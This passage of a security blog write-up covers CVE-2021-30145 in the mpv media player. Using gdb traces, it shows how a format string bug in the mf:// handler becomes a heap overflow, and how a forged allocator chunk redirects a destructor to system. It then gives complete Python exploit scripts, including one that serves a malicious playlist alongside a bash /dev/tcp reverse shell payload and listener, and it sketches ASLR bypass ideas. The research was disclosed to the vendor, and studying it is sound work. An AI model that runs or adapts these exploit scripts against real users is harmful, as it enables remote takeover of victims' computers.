gdb-peda$ x/20xg 0x7fffe40020a0-0x50
0x7fffe4002050: 0x0000000000000026 0x0000000000000000
0x7fffe4002060: 0x0000000000000000 0x0000000000000000
0x7fffe4002070: 0x00007fffe4001fd0 0x0000000000000000
0x7fffe4002080: 0x00000000d3adb3ef 0x0000000000000000
0x7fffe4002090: 0x0000000000000000 0x0000000000000000
0x7fffe40020a0: 0x0000000000000000 0x0000000000000000
0x7fffe40020b0: 0x0000000000000000 0x0000000000000000
0x7fffe40020c0: 0x0000000000000000 0x000000000001ef41
0x7fffe40020d0: 0x0000000000000000 0x0000000000000000
0x7fffe40020e0: 0x0000000000000000 0x0000000000000000`

Now let’s proceed to the call to \_\_sprintf\_chk:

`gdb-peda$ c
Continuing.
...
=> 0x5555555ae3cf <open_mf_pattern+559>: call 0x5555555867c0 <__sprintf_chk@plt>
0x5555555ae3d4 <open_mf_pattern+564>: mov rdi,r13
0x5555555ae3d7 <open_mf_pattern+567>: call 0x5555555e9b60 <mp_path_exists>
0x5555555ae3dc <open_mf_pattern+572>: test al,al
0x5555555ae3de <open_mf_pattern+574>: je 0x5555555ae390 <open_mf_pattern+496>
Guessed arguments:
arg[0]: 0x7fffe40020a0 --> 0x0
arg[1]: 0x1
arg[2]: 0xffffffffffffffff
arg[3]: 0x7fffe40011f5 --> 0x643030303125 ('%1000d')
arg[4]: 0x0`

We can verify that the destination buffer is the allocated chunk at 0x7fffe40020a0. Let’s execute the \_\_sprintf\_chk by stepping to the next instruction:

`gdb-peda$ ni
...
0x5555555ae3cf <open_mf_pattern+559>: call 0x5555555867c0 <__sprintf_chk@plt>
=> 0x5555555ae3d4 <open_mf_pattern+564>: mov rdi,r13`

The \_\_sprintf\_chk call wrote way beyond the 0x26 bytes allocated for the chunk:

`gdb-peda$ x/100xg 0x7fffe40020a0-0x50
0x7fffe4002050: 0x0000000000000026 0x0000000000000000
0x7fffe4002060: 0x0000000000000000 0x0000000000000000
0x7fffe4002070: 0x00007fffe4001fd0 0x0000000000000000
0x7fffe4002080: 0x00000000d3adb3ef 0x0000000000000000
0x7fffe4002090: 0x0000000000000000 0x0000555555666ccf
0x7fffe40020a0: 0x2020202020202020 0x2020202020202020
0x7fffe40020b0: 0x2020202020202020 0x2020202020202020
0x7fffe40020c0: 0x2020202020202020 0x2020202020202020
0x7fffe40020d0: 0x2020202020202020 0x2020202020202020
0x7fffe40020e0: 0x2020202020202020 0x2020202020202020
0x7fffe40020f0: 0x2020202020202020 0x2020202020202020
0x7fffe4002100: 0x2020202020202020 0x2020202020202020
0x7fffe4002110: 0x2020202020202020 0x2020202020202020
0x7fffe4002120: 0x2020202020202020 0x2020202020202020
0x7fffe4002130: 0x2020202020202020 0x2020202020202020
0x7fffe4002140: 0x2020202020202020 0x2020202020202020
0x7fffe4002150: 0x2020202020202020 0x2020202020202020
0x7fffe4002160: 0x2020202020202020 0x2020202020202020
0x7fffe4002170: 0x2020202020202020 0x2020202020202020
0x7fffe4002180: 0x2020202020202020 0x2020202020202020
0x7fffe4002190: 0x2020202020202020 0x2020202020202020
0x7fffe40021a0: 0x2020202020202020 0x2020202020202020
...`

If we continue the execution of the program, we get a segmentation fault because of the corrupted heap:

`gdb-peda$ d br 1
gdb-peda$ c
Continuing.
[mf] number of files: 0
free(): invalid next size (fast)
Thread 3 "mpv/opener" received signal SIGABRT, Aborted.
...
Stopped reason: SIGABRT
__GI_raise (sig=sig@entry=0x6) at ../sysdeps/unix/sysv/linux/raise.c:50
50 ../sysdeps/unix/sysv/linux/raise.c: No such file or directory.`

We have verified that the sprintf call also results in a heap overflow vulnerability.

# Exploitation

In the last section we have seen that the usage of sprintf with a user controllable format string and no boundary checks introduces two kind of vulnerabilities: a format string vulnerability as well as a heap overflow, which is based on the format string vulnerability.

A format string vulnerability is usually a very powerful exploitation primitive. The combination of output padding (e.g. %1337d) with the usage of the %n format specifier can generally be used in order to write arbitrary values to memory. By [leveraging the dynamic field width](https://devel0pment.de/?p=1881#shellcode) it might even be possible to bypass ASLR in an one-shot exploit. Though in this case the impact of the format string vulnerability is limited on Linux, because the binary is compiled with FORTIFY\_SOURCE by default. Because of this the call to sprintf is replaced with a call to \_\_sprintf\_chk, which terminates the program if a %n format specifier is used within a format string in writable memory (\*\*\* %n in writable segment detected \*\*\*). In order to determine this \_\_sprintf\_chk parses the output of /proc/self/maps. From a security perspective this is a good trade-off: the %n can still be used in static (read-only) strings, but the primary exploitation technique (using %n in a writable format string) is eliminated. From an exploitation development perspective this is bad: we cannot use the format string vulnerability to write to memory. This limits it to the ability to leak memory addresses, which is quite useless considering the assumed attack vector, where a victim is lured into opening a malicious URL. For a remote attacker it is not of any use, if a few leaked addresses pop up in the victims shell. On Windows the situation is a little bit different, but we will focus on Linux for now.

Here we are left with the heap overflow, which is based on the format string vulnerability and can be provoked by using padded format specifiers. A heap overflow introduces a huge amount of exploitation possibilities, but is very dependent on the concrete context. In some situations even a single null byte overflow can be used to gain arbitrary code execution by [corrupting the heap meta data](https://devel0pment.de/?p=688).

For the development of this proof of concept exploit I am using mpv 0.33.0 on Ubuntu 20.04.2 LTS with GLIBC 2.31-0ubuntu9.2 and ASLR disabled.

We have already seen that mpv seems to use some custom allocation mechanisms, since the chunk for the format string was not allocated using a plain malloc, but rather the custom function talloc\_size. The allocator used here is called Tree Allocator, which core is implemented in [ta.c](https://github.com/mpv-player/mpv/blob/v0.33.0/ta/ta.c). More details can be found [here](https://github.com/mpv-player/mpv/tree/v0.33.0/ta). Basically the idea is to not only have independently allocated chunks, but a tree structure of allocated chunks. For this purpose each chunk is proceeded by a header struct called ta\_header:

`struct ta_header {
size_t size; // size of the user allocation
// Invariant: parent!=NULL => prev==NULL
struct ta_header *prev; // siblings list (by destructor order)
struct ta_header *next;
// Invariant: parent==NULL || parent->child==this
struct ta_header *child; // points to first child
struct ta_header *parent; // set for _first_ child only, NULL otherwise
void (*destructor)(void *);
#if TA_MEMORY_DEBUGGING
unsigned int canary;
struct ta_header *leak_next;
struct ta_header *leak_prev;
const char *name;
#endif
};`

What is really eye-catching here from an exploitation point of view is the destructor function pointer. Having a function pointer on the heap possibly enables the ability to leverage the heap overflow vulnerability in order to overflow into an adjacent chunk overwriting this function pointer. When the program calls the destructor function for this specific chunk without crashing beforehand, we gain code execution.

In the above ta\_header struct we can also see, that there is a canary member if TA\_MEMORY\_DEBUGGING is enabled, which is the case by default. Though the purpose of this canary is to prevent software bugs rather than being an exploitation mitigation. Accordingly the canary is always set to the static value 0xD3ADB3EF:

`...
#define CANARY 0xD3ADB3EF
...
static void ta_dbg_add(struct ta_header *h)
{
h->canary = CANARY;
...`

My first approach was to simply follow the before mentioned strategy: overflow into an adjacent chunk and overwrite the destructor function pointer. At first we need to determine where the destructor function is called from. This leads us to the function ta\_free:

`void ta_free(void *ptr)
{
struct ta_header *h = get_header(ptr);
if (!h)
return;
if (h->destructor)
h->destructor(ptr);
ta_free_children(ptr);
ta_set_parent(ptr, NULL);
ta_dbg_remove(h);
free(h);
}`

The logic is straightforward: if the destructor is set (not NULL), it is called with the first argument being the chunk pointer to be free’d (ptr). Beforehand (in the first line) get\_header is called to get the pointer to the ta\_header struct. Within get\_header an additional function named ta\_dbg\_check\_header is called:

`static struct ta_header *get_header(void *ptr)
{
struct ta_header *h = ptr ? PTR_TO_HEADER(ptr) : NULL;
ta_dbg_check_header(h);
return h;
}`

This function validates the chunk by comparing the canary value and checking the integrity of the parent pointer:

`static void ta_dbg_check_header(struct ta_header *h)
{
if (h) {
assert(h->canary == CANARY);
if (h->parent) {
assert(!h->prev);
assert(h->parent->child == h);
}
}
}`

We need to keep this in mind when crafting our exploit.

At first we start to implement a little web-server, which only serves a playlist file (regardless of the request):

`#!/usr/bin/env python3
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('localhost', 7000))
s.listen(5)
c, a = s.accept()
playlist = b'mf://'
playlist += b'A'*0x48
playlist += b'%d' # we need a '%' to reach vulnerable path
d = b'HTTP/1.1 200 OK\r\n'
d += b'Content-type: audio/x-mpegurl\r\n'
d += b'Content-Length: '+str(len(playlist)).encode()+b'\r\n'
d += b'\r\n'
d += playlist
c.send(d)
c.close()`

The script starts a listening socket on port 7000 and answers to all connecting clients with a HTTP response containing a playlist file (Content-type: audio/x-mpegurl). The playlist in the body only contains a single entry: mf://AAAA…%d. The % is necessary to reach the \_\_sprintf\_chk call. The amount of As (0x48) is used to adjust the size of the filename. This is relevant, because depending on the size of the filename, the allocated chunk ends up in different heap locations. If we for example only use mf://AAAA%d the call to ta\_alloc\_size requests a smaller chunk for the destination buffer, which will be served from a different location in the heap. Using ‘mf://’ + ‘A’\*0x48 + ‘%d’ turned out to end up in a suitable heap location. Let’s start gdb again, set a breakpoint on the \_\_sprintf\_chk call and try to open the playlist:

`gdb-peda$ b *open_mf_pattern+559
Breakpoint 1 at 0x5a3cf: file /usr/include/x86_64-linux-gnu/bits/stdio2.h, line 36.
gdb-peda$ r http://localhost:7000/x.m3u
Starting program: /home/user/opt/mpv/build/mpv http://localhost:7000/x.m3u
...
[-------------------------------------code-------------------------------------]
0x5555555ae3c0 <open_mf_pattern+544>: mov rdx,0xffffffffffffffff
0x5555555ae3c7 <open_mf_pattern+551>: mov esi,0x1
0x5555555ae3cc <open_mf_pattern+556>: add ebx,0x1
=> 0x5555555ae3cf <open_mf_pattern+559>: call 0x5555555867c0 <__sprintf_chk@plt>
0x5555555ae3d4 <open_mf_pattern+564>: mov rdi,r13
0x5555555ae3d7 <open_mf_pattern+567>: call 0x5555555e9b60 <mp_path_exists>
0x5555555ae3dc <open_mf_pattern+572>: test al,al
0x5555555ae3de <open_mf_pattern+574>: je 0x5555555ae390 <open_mf_pattern+496>
Guessed arguments:
arg[0]: 0x7fffe400e930 --> 0x55555572bba0 --> 0x0
arg[1]: 0x1
arg[2]: 0xffffffffffffffff
arg[3]: 0x7fffe408f695 ('A' <repeats 72 times>, "%d")
arg[4]: 0x0
...`

We hit the breakpoint. The destination of \_\_sprintf\_chk, which is the chunk allocated by ta\_alloc\_size is located at 0x7fffe400e930 (first parameter). This address references the actual data of the allocated chunk. In order to see the ta\_header before it, we need to substract 0x50 from this address:

`gdb-peda$ x/70xg 0x7fffe400e930-0x50
0x7fffe400e8e0: 0x000000000000006a 0x0000000000000000 <-- [ size | prev ]
0x7fffe400e8f0: 0x0000000000000000 0x0000000000000000 <-- [ next | child ]
0x7fffe400e900: 0x00007fffe400d0a0 0x0000000000000000 <-- [ parent | destructor ]
0x7fffe400e910: 0x00000000d3adb3ef 0x0000000000000000 <-- [ canary | leak_next ]
0x7fffe400e920: 0x0000000000000000 0x0000555555666ccf <-- [ leak_prev | name ]
0x7fffe400e930: 0x000055555572bba0 0x0000000000000009 <-- begin actual data ...
0x7fffe400e940: 0x00007fffe400d3f0 0x0000000000000001
0x7fffe400e950: 0x0000000000000080 0x0000000000000084
0x7fffe400e960: 0x00007fffe400dda0 0x00007fffe40008d0
0x7fffe400e970: 0x0000000000000000 0x0000000000000000
0x7fffe400e980: 0x0000000000000000 0x0000000000000000
0x7fffe400e990: 0x0000000000000000 0x0000000000000000
0x7fffe400e9a0: 0x0000000000000000 0x0000000000000031
0x7fffe400e9b0: 0x00007fffe4000080 0x00007fffe4000080
0x7fffe400e9c0: 0x0000000000000000 0x000000810000ac44
0x7fffe400e9d0: 0x0000000000000030 0x00000000000000f4
0x7fffe400e9e0: 0x00007fffe400f240 0x00005555556ec010
0x7fffe400e9f0: 0x0000000000000000 0x0000000000000000
0x7fffe400ea00: 0x0000000000000000 0x00005555555d92e0
0x7fffe400ea10: 0x0000000000000000 0x0000000000000000
0x7fffe400ea20: 0x0000000000000000 0x0000555555670d90
0x7fffe400ea30: 0x00007fffe400f290 0x0000000000000000
0x7fffe400ea40: 0x0000000000000000 0x000055555572bba0
0x7fffe400ea50: 0x00007fffe400ea58 0x0000000000000000
0x7fffe400ea60: 0x00007fffe400e5c0 0x000055555572c470
0x7fffe400ea70: 0x000055555572bba0 0x0000002100000020
0x7fffe400ea80: 0x0000000000000000 0xffffffff00000000
0x7fffe400ea90: 0x0000000000000000 0x0000000000000000
0x7fffe400eaa0: 0x0000000000000000 0x0000000000000000
0x7fffe400eab0: 0x0000000000000000 0x0000000000000000
0x7fffe400eac0: 0x0000000000000000 0x0000000000000265
0x7fffe400ead0: 0x00000000000001f8 0x00007fffe400cf50 <-- [ size | prev ]
0x7fffe400eae0: 0x00007fffe400e6a0 0x00007fffe400e7f0 <-- [ next | child ]
0x7fffe400eaf0: 0x0000000000000000 0x0000000000000000 <-- [ parent | destructor ]
0x7fffe400eb00: 0x00000000d3adb3ef 0x0000000000000000 <-- [ canary | ...`

We can see that there is actually an adjacent chunk, which ta\_header struct begins at 0x7fffe400ead0.

Our next goal is to overwrite the destructor pointer of this adjacent chunk. We also need to ensure that we bypass the check within ta\_dbg\_check\_header mentioned before:

`static void ta_dbg_check_header(struct ta_header *h)
{
if (h) {
assert(h->canary == CANARY);
if (h->parent) {
assert(!h->prev);
assert(h->parent->child == h);
}
}
}`

The canary value is not a problem, because it is located after the destructor pointer. Though we need to set the parent to NULL, in order to prevent the assertion checks within the inner if statement.

This can be satisfied by using the following URL:

`...
playlist = b'mf://'
playlist += b'A'*0x18
playlist += b'%422c%c%c%4$c%4$c%4$c%4$c%4$c%4$c%4$c%4$c\xef\xbe\xad\xde'
...`

The b’A’\*0x18 ensures that the size of the filename stays the same so that we end up in the desired heap location. The first padded format specifier %422c provokes the heap overflow and ensures that the following data ends up at the correct location within the ta\_header of the adjacent chunk. The purpose of the two following %c is just to skip to an argument, which value is 0. This is the case for the fourth argument as we can see on the call to \_\_sprintf\_chk:

`...
R8 : 0x0 <-- 1st argument (will change due to the for loop)
R9 : 0x4 <-- 2nd argument
...
=> 0x5555555ae3cf <open_mf_pattern+559>: call 0x5555555867c0 <__sprintf_chk@plt>
...
[------------------------------------stack-------------------------------------]
0000| 0x7fffebcaee00 --> 0x7fffebcaf0df --> 0x5555556b95a000 <-- 3rd argument
0008| 0x7fffebcaee08 --> 0x0 <-- 4th argument
...`

On the first call to \_\_sprintf\_chk the first argument is 0 too, but this will change on the next loop iteration. The fourth argument stays 0 throughout the loop, so we use this.

Next within the URL is %4$c%4$c%4$c%4$c%4$c%4$c%4$c%4$c, which writes eight null bytes (0x0000000000000000) to the destination. These will end up in the parent pointer of the adjacent chunk. After this follows \xef\xbe\xad\xde, which will write the value 0xdeadbeef to the destructor pointer:

`struct ta_header {
...
struct ta_header *parent; // <-- 0x0000000000000000
void (*destructor)(void *); // <-- 0xdeadbeef
...
};`

Let’s rerun the web-server with the adjusted URL and open it with mpv:

`gdb-peda$ r http://localhost:7000/x.m3u
Starting program: /home/user/opt/mpv/build/mpv http://localhost:7000/x.m3u
...
[-------------------------------------code-------------------------------------]
0x5555555ae3c0 <open_mf_pattern+544>: mov rdx,0xffffffffffffffff
0x5555555ae3c7 <open_mf_pattern+551>: mov esi,0x1
0x5555555ae3cc <open_mf_pattern+556>: add ebx,0x1
=> 0x5555555ae3cf <open_mf_pattern+559>: call 0x5555555867c0 <__sprintf_chk@plt>
0x5555555ae3d4 <open_mf_pattern+564>: mov rdi,r13
0x5555555ae3d7 <open_mf_pattern+567>: call 0x5555555e9b60 <mp_path_exists>
0x5555555ae3dc <open_mf_pattern+572>: test al,al
0x5555555ae3de <open_mf_pattern+574>: je 0x5555555ae390 <open_mf_pattern+496>
Guessed arguments:
arg[0]: 0x7fffe400e930 --> 0x55555572bba0 --> 0x0
arg[1]: 0x1
arg[2]: 0xffffffffffffffff
arg[3]: 0x7fffe408f695 ('A' <repeats 24 times>, "%422c%c%c%4$c%4$c%4$c%4$c%4$c%4$c%4$c%4$c", <incomplete sequence \336>)
arg[4]: 0x0
...`

At this point we are right before the call to \_\_sprintf\_chk and the adjacent chunk is still untouched:

`gdb-peda$ x/10xg 0x7fffe400ead0
0x7fffe400ead0: 0x00000000000001f8 0x00007fffe400cf50 <-- [ size | prev ]
0x7fffe400eae0: 0x00007fffe400e6a0 0x00007fffe400e7f0 <-- [ next | child ]
0x7fffe400eaf0: 0x0000000000000000 0x0000000000000000 <-- [ parent | destructor ]
0x7fffe400eb00: 0x00000000d3adb3ef 0x0000000000000000 <-- [ canary | leak_next ]
0x7fffe400eb10: 0x0000000000000000 0x0000555555664822 <-- [ leak_prev | name ]`

If we now step to the next instruction, \_\_sprintf\_chk is called with our format string and the overflow is triggered:

`gdb-peda$ ni
...
gdb-peda$ x/10xg 0x7fffe400ead0
0x7fffe400ead0: 0x2020202020202020 0x2020202020202020 <-- [ size | prev ]
0x7fffe400eae0: 0x2020202020202020 0xdf04002020202020 <-- [ next | child ]
0x7fffe400eaf0: 0x0000000000000000 0x00000000deadbeef <-- [ parent | destructor ]
0x7fffe400eb00: 0x00000000d3adb3ef 0x0000000000000000 <-- [ canary | leak_next ]
0x7fffe400eb10: 0x0000000000000000 0x0000555555664822 <-- [ leak_prev | name ]`

The first members of the ta\_header are simply overwritten with 0x20 bytes (space), because of the padding we used. Though these members are not relevant in order to reach the destructor function call. The parent member was successfully overwritten with 0x0000000000000000 and the destructor with 0x00000000deadbeef. If we continue the execution, we get a segmentation fault, which is caused by the RIP being 0xdeadbeef:

`gdb-peda$ c
Continuing.
[mf] number of files: 0
Thread 4 "mpv/opener" received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0xdeadbeef
RBX: 0x7fffe4001500 --> 0x5555556b95a0 --> 0x555555666d36 --> 0x6567616d6900666d ('mf')
RCX: 0x1
RDX: 0x0
RSI: 0x7fffe400cf50 --> 0x0
RDI: 0x7fffe400eb20 --> 0x7fffe400e6f0 --> 0x55555572b460 --> 0x55555572b320 --> 0x55555572b5d0 (0x000055555572b460)
RBP: 0x7fffe400eb20 --> 0x7fffe400e6f0 --> 0x55555572b460 --> 0x55555572b320 --> 0x55555572b5d0 (0x000055555572b460)
RSP: 0x7fffebcaf0d8 --> 0x55555565e40d (<ta_free+45>: mov rdi,rbp)
RIP: 0xdeadbeef
R8 : 0x0
R9 : 0x1
R10: 0x1
R11: 0x0
R12: 0x7fffe400ead0 (" ")
R13: 0x7fffe40016f0 --> 0x55555572b460 --> 0x55555572b320 --> 0x55555572b5d0 (0x000055555572b460)
R14: 0x55555572b320 --> 0x55555572b5d0 --> 0x55555572b460 (0x000055555572b320)
R15: 0x5555556b95a0 --> 0x555555666d36 --> 0x6567616d6900666d ('mf')
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0xdeadbeef
[------------------------------------stack-------------------------------------]
0000| 0x7fffebcaf0d8 --> 0x55555565e40d (<ta_free+45>: mov rdi,rbp)
0008| 0x7fffebcaf0e0 --> 0x7fffe40016f0 --> 0x55555572b460 --> 0x55555572b320 --> 0x55555572b5d0 (0x000055555572b460)
0016| 0x7fffebcaf0e8 --> 0x7fffe4001500 --> 0x5555556b95a0 --> 0x555555666d36 --> 0x6567616d6900666d ('mf')
0024| 0x7fffebcaf0f0 --> 0x7fffe40014b0 --> 0xf8
0032| 0x7fffebcaf0f8 --> 0x55555565e5b9 (<ta_free_children+41>: mov rdi,QWORD PTR [rbx-0x38])
0040| 0x7fffebcaf100 --> 0x7fffebcaf260 --> 0xc2f000000 ('')
0048| 0x7fffebcaf108 --> 0x55555565e415 (<ta_free+53>: mov rdi,rbp)
0056| 0x7fffebcaf110 --> 0x7fffe400eb20 --> 0x7fffe400e6f0 --> 0x55555572b460 --> 0x55555572b320 --> 0x55555572b5d0 (0x000055555572b460)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000deadbeef in ?? ()`

We successfully control the instruction pointer. Though the context is not very opportune. At this point we only control the RIP, but no other registers. Since we are not directly interacting with the program, we cannot simply use a one\_gadget. My first idea was to find a gadget, which will change RSP and R12, because it seems that we can control the content the pointer in R12 is referencing (spaces from padding: ” “). If RSP would be set to this address, we could store a more complex ROP chain there. Nevertheless I didn’t find a suitable gadget.

By reading the source code again I came up with another idea. Let’s have a look at ta\_free again:

`void ta_free(void *ptr)
{
struct ta_header *h = get_header(ptr);
if (!h)
return;
if (h->destructor)
h->destructor(ptr);
ta_free_children(ptr);
ta_set_parent(ptr, NULL);
ta_dbg_remove(h);
free(h);
}`

After the destructor call the function ta\_free\_children is called, which is obviously responsible for free’ing a child chunk. The function retrieves the child pointer within the ta\_header and also passes it to ta\_free, if it is set:

`void ta_free_children(void *ptr)
{
struct ta_header *h = get_header(ptr);
while (h && h->child)
ta_free(PTR_FROM_HEADER(h->child));
}`

This enables another strategy: instead of directly overwriting the destructor pointer, we can overwrite the child pointer with the address of a forged fake chunk. For this fake chunk we set the destructor pointer to the function address of system and store a command of our choice in the actual data. When ta\_free is called for this child, the ptr points to the command. This ptr is passed as the first argument to the destructor, which is system. This way we can run arbitrary commands through system. This is very similar to a glibc heap exploit, where \_\_free\_hook is set to system and a chunk is free’d, which contains the command to be executed.

Storing the fake chunk in the URL is not a very good option, because editing the URL also results in another allocation size. This possibly causes the chunk to end up in another heap location. Also we must use the format specifier %4$c in order to write a single null byte. A more suitable place for the fake chunk is the HTTP response we send. We can simply insert a custom HTTP header, which is not evaluated by the target application and only serves the purpose of delivering our fake chunk to the memory of the application. The adjustments in the script look like this:

`...
playlist = b'mf://'
playlist += b'%390c%c%c'
playlist += b'\x58\x1e%4$c\xe4\xff\x7f' # overwriting child addr with fake child
SYSTEM_ADDR = 0x7ffff5c37410
CANARY = 0xD3ADB3EF
fake_chunk = p64(0) # size
fake_chunk += p64(0) # prev
fake_chunk += p64(0) # next
fake_chunk += p64(0) # child
fake_chunk += p64(0) # parent
fake_chunk += p64(SYSTEM_ADDR) # destructor
fake_chunk += p64(CANARY) # canary
fake_chunk += p64(0) # leak_next
fake_chunk += p64(0) # leak_prev
fake_chunk += p64(0) # name
d = b'HTTP/1.1 200 OK\r\n'
d += b'Content-type: audio/x-mpegurl\r\n'
d += b'Content-Length: '+str(len(playlist)).encode()+b'\r\n'
d += b'PL: '
d += fake_chunk
d += b'gnome-calculator\x00'
d += b'\r\n'
d += b'\r\n'
d += playlist
...`

The padding has changed to %390c, since we are now targeting the child member of the ta\_header. This pointer is overwritten with the static address 0x7fffe4001e58 (ASLR is disabled!), which references the fake chunk stored in the HTTP response. The destructor of the fake chunk is set to system. Also canary is set to the required value 0xD3ADB3EF (this is important for the validation check within ta\_dbg\_check\_header). The command to be executed is set to gnome-calculator to spawn a calculator.

In order to trigger the exploit, we run the payload serving script and start mpv with the malicious playlist URL:

![](https://devel0pment.de/wp-content/uploads/2021/04/mpv_01.gif)

Since we have full control of the executed command, we can easily run more complex commands like a reverse shell. The following python script uses such a reverse shell payload and starts a corresponding handler as well as the payload serving web-server:

`#!/usr/bin/env python3
import socket
from pwn import *
from threading import Thread
LHOST = 'localhost'
LPORT = 9001
SRVHOST = 'localhost'
SRVPORT = 7000
OFFSET = 390 # padding to overflow heap
CANARY = 0xD3ADB3EF
SYSTEM_ADDR = 0x7ffff5c37410
PAYLOAD = 'bash -c "bash -i >& /dev/tcp/'+LHOST+'/'+str(LPORT)+' 0>&1"\x00'
class RevShellHandler(Thread):
def run(self):
while True:
io = listen(LPORT, LHOST)
io.wait_for_connection()
io.interactive()
class PayloadHandler(Thread):
def run(self):
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((SRVHOST, SRVPORT))
s.listen(5)
log.info('ready to serve payload on http://'+SRVHOST+':'+str(SRVPORT)+'/x.m3u')
while True:
c, a = s.accept()
self.handle_client(c, a)
def handle_client(self, c, a):
log.warn('serving payload to '+a[0]+':'+str(a[1]))
playlist = b'mf://'
playlist += b'%'+str(OFFSET).encode()+b'c%c%c'
playlist += b'\x58\x1e%4$c\xe4\xff\x7f' # overwriting child addr with fake child
fake_chunk = p64(0) # size
fake_chunk += p64(0) # prev
fake_chunk += p64(0) # next
fake_chunk += p64(0) # child
fake_chunk += p64(0) # parent
fake_chunk += p64(SYSTEM_ADDR) # destructor
fake_chunk += p64(CANARY) # canary
fake_chunk += p64(0) # leak_next
fake_chunk += p64(0) # leak_prev
fake_chunk += p64(0) # name
d = b'HTTP/1.1 200 OK\r\n'
d += b'Content-type: audio/x-mpegurl\r\n'
d += b'Content-Length: '+str(len(playlist)).encode()+b'\r\n'
d += b'PL: '
d += fake_chunk
d += PAYLOAD.encode()
d += b'\r\n'
d += b'\r\n'
d += playlist
c.send(d)
c.close()
reh = RevShellHandler()
reh.start()
plh = PayloadHandler()
plh.start()`

The script in action:

![](https://devel0pment.de/wp-content/uploads/2021/04/mpv_02.gif)
# Further Thoughts

In this section we will take a look at possibilities to bypass ASLR and briefly determine how the situation is on Windows from an exploit development point of view.

### ASLR bypass

After having verified that we can gain arbitrary code execution on Linux with ASLR disabled, let’s think about how ASLR might be bypassed.

What makes this challenging is that the attack vector seems to be a one-shot: the targeted client requests the malicious playlist from us and we serve the payload in form of the mf:// URL. The communication ends here and there seems to be no way we could get an address leak required to bypass ASLR. Though this is not totally true. The word playlist implies that this file is a list. We can not only store one malicious mf:// URL, but for example an additional http:// URL like this:

`mf://<EVIL>
http://attacker/xyz`

Before the first entry in the playlist (mf://<EVIL>) is evaluated, the whole playlist is parsed. This includes allocating chunks for all entries within the playlist. After this the entries are evaluated or fetched one after another. Using the mf://<EVIL> entry we can leverage the heap overflow in order to overwrite the second playlist entry, which is the http://attacker/xyz URL to fetch next. If we change this URL to contain an address from the application, we retrieve this address via HTTP as soon as the client requests it. The challenge here is to groom the heap, so that the chunk allocated for the \_\_sprintf\_chk destination is right before the chunk allocated for the http://attacker/xyz URL to fetch.

The next question is how do we use the leaked address without the requirement of having to manually open yet another malicious playlist URL? The answer to this is straightforward: we simply use a cascade by additionally providing the URL to another playlist .m3u file:

`mf://<EVIL>
http://attacker/xyz
http://attacker/stage2.m3u`

This way the stage2.m3u playlist will be requested after the http://attacker/xyz request and its content will be evaluated just like the playlist before. This time the stage2.m3u playlist file can contain our original exploit to gain code execution, but is created on the fly to contain the correct addresses based on the first HTTP request (http://attacker/xyz), which leaked the applications addresses.

### Windows

mpv is available for a wide variety of operation systems, but let’s have at least a brief look at Windows.

Although I didn’t dig deep into developing an exploit for Windows yet, I assume that the conditions are far more in our favor here. One reason for this is that there is no FORTIFY\_SOURCE by default. Thus we are able to use the %n format specifier in order to write to memory. What makes it a little less comfortable is that there are no argument selectors (e.g. %4$c).

There is another interesting Windows specific aspect when using the mf:// protocol. On Linux we can reference the local file /tmp/test.jpg by providing mf:///tmp/test.jpg. On Windows we would use mf://C:\Windows\Temp\test.jpg in order to reference the file C:\windows\Temp\test.jpg. When dealing with file paths like this, it is sometimes possible to increase the exploitation possibilities on Windows by using [UNC paths](https://en.wikipedia.org/wiki/Path_%28computing%29#Universal_Naming_Convention). This is totally true here, because we can actually use a UNC path within the mf:// protocol handler. Also we can provide format specifiers in the requested UNC path. This means that we can easily leak addresses via SMB:

![](https://devel0pment.de/wp-content/uploads/2021/04/mpv_03.gif)

This possibility makes it even more easy to bypass ASLR on Windows.

# Conclusion

The exciting aspect of memory corruption vulnerabilities is that they arise a lot of opportunities, which oftentimes can be turned into code execution by putting enough work into it.

Even with mitigations like FORTIFY\_SOURCE the impact of a format string vulnerability is most probably severe. In this case the implicitly deduced heap overflow allows an attacker to gain arbitrary code execution on Linux. Also there are ways to bypass ASLR and probably also develop an exploit for other operating systems.

Thanks again to the mpv team for the quick response, professional reaction and fast patch. It is good to know that security is taken seriously 🙂

**Timeline**

03 April 2021 – Vendor Notification

03 April 2021 – Vendor Acknowledgement

05 April 2021 – Vendor Patch

12 April 2021 – Public Disclosure

 Post Views: 17,006

  Categories[article](https://devel0pment.de/?cat=29)  Tags[CVE-2021-30145](https://devel0pment.de/?tag=cve-2021-30145), [exploitation](https://devel0pment.de/?tag=exploitation), [formatstring](https://devel0pment.de/?tag=formatstring), [heap](https://devel0pment.de/?tag=heap), [linux](https://devel0pment.de/?tag=linux), [x64](https://devel0pment.de/?tag=x64)

## Post navigation

[Previous PostPrevious   HACKvent20 writeup](https://devel0pment.de/?p=2084)[Next PostNext Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)

Search for:

Search

## Pages

* [About](https://devel0pment.de/?page_id=2665)
* [Contact](https://devel0pment.de/?page_id=2)

## Recent Posts

* [Hack The Box – Response](https://devel0pment.de/?p=2594)
* [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)
* [ASIS CTF Quals 2021 – ASCII art a a service](https://devel0pment.de/?p=2431)
* [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)
* [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)
## Recent Comments

* scryh on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4174)
* [m3dsec](https://m3dsec.github.io/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4173)
* [TobjasR](https://www.linkedin.com/in/tobjasr/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-3704)
* scryh on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3411)
* Tomer on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3408)
## Archives

* [February 2023](https://devel0pment.de/?m=202302)
* [March 2022](https://devel0pment.de/?m=202203)
* [October 2021](https://devel0pment.de/?m=202110)
* [May 2021](https://devel0pment.de/?m=202105)
